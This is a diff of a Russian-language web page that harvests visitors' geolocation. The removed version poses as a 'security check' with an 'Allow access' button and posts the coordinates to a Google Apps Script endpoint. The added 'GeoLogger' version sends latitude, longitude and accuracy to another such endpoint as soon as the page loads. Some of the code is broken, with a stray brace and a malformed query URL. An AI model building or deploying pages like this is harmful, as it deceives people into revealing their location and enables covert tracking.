@@ -2,141 +2,28 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Проверка безопасности</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background: #f0f0f0;
-      color: #333;
-      text-align: center;
-    }
-    .loader {
-      margin-top: 20px;
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #333;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      display: none;
-    }
-    #consentBtn {
-      padding: 12px 24px;
-      background: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+  <title>GeoLogger</title>
 </head>
 <body>
-  <h2>Проверка безопасности</h2>
-  <button id="consentBtn">Разрешить доступ</button>
-  <div class="loader"></div>
+  <h2>Определение геопозиции…</h2>
 
   <script>
-    const loader = document.querySelector('.loader');
-    const consentBtn = document.getElementById('consentBtn');
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const acc = position.coords.accuracy;
 
-    // Универсальная функция формирования параметров
-    function buildBody(params) {
-      return Object.keys(params)
-        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
-        .join('&');
-    }
-
-    // Проверка поддержки геолокации
-    if (!navigator.geolocation) {
-      consentBtn.style.display = 'none';
-      alert("Ваш браузер устарел и не поддерживает геолокацию!");
-    }
-
-    function requestGeolocation() {
-      loader.style.display = 'block';
-      consentBtn.style.display = 'none';
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          console.log('Данные геолокации:', pos.coords);
-          sendLocation(pos);
-        },
-        err => {
-          console.error('Ошибка геолокации:', err);
-          handleGeoError(err);
-        },
-        {
-          enableHighAccuracy: false,
-          timeout: 60000,
-          maximumAge: 0
-        }
-      );
-    }
-
-    function sendLocation(pos) {
-      const lat = pos.coords.latitude?.toFixed(6) || '0';
-      const lon = pos.coords.longitude?.toFixed(6) || '0';
-      const acc = pos.coords.accuracy?.toFixed(2) || '0';
-
-      const scriptURL = 'https://script.google.com/macros/s/AKfycbwCC_Vmod7Io0zIv9DkPtYNjndCIHoFk6kkAz0gANpzMHnAfjAEyaDXSIalLKn1n2-W/exec';
-      const body = buildBody({ lat, lon, acc });
-
-      console.log('Отправляемые данные:', body);
-
-      fetch(scriptURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: body
-      })
-      .then(response => {
-        console.log('Статус ответа:', response.status);
-        if (!response.ok) throw new Error(`Ошибка сервера: ${response.status}`);
-        return response.json();
-      })
-      .then(data => {
-  console.log('Ответ сервера:', data); // Используйте console.log для объектов
-  if (data.status === 'success') {
-    setTimeout(() => {
-      window.location.href = "/next-page.html";
-    }, 1000);
-  } else {
-    throw new Error(data.message || 'Неизвестная ошибка сервера');
-  }
-})
-      })
-      .catch(err => {
-        console.error('Фатальная ошибка:', err);
-        alert('Ошибка связи с сервером: ' + err.message);
-      })
-      .finally(() => {
-        loader.style.display = 'none';
-        consentBtn.style.display = 'block';
-      });
-    }
-
-    function handleGeoError(err) {
-      const errorMessages = {
-        1: "🔒 Разрешите доступ к геолокации в настройках браузера",
-        2: "📍 Ошибка определения местоположения:\n1. Проверьте интернет\n2. Включите GPS\n3. Дайте разрешение браузеру",
-        3: "⏳ Слишком долгий ответ. Убедитесь, что GPS активен"
-      };
-      
-      alert(errorMessages[err.code] || "Неизвестная ошибка: " + err.message);
-      loader.style.display = 'none';
-      consentBtn.style.display = 'block';
-    }
-
-    consentBtn.addEventListener('click', requestGeolocation);
+      fetch("https://script.google.com/macros/s/AKfycbwlw3rbYm_Or8tPFxiMx8_oRv0vNM2sxUe43Zf7sS1DMdzmGYl_Jmvc20lfDO0ixRL9/exec" + lat + "&lon=" + lon + "&acc=" + acc)
+        .then(res => res.text())
+        .then(data => {
+          document.body.innerHTML += `<p>Отправлено: ${data}</p>`;
+        })
+        .catch(err => {
+          document.body.innerHTML += `<p>Ошибка: ${err}</p>`;
+        });
+    }, function(err) {
+      document.body.innerHTML += `<p>Ошибка геолокации: ${err.message}</p>`;
+    });
   </script>
 </body>
 </html>
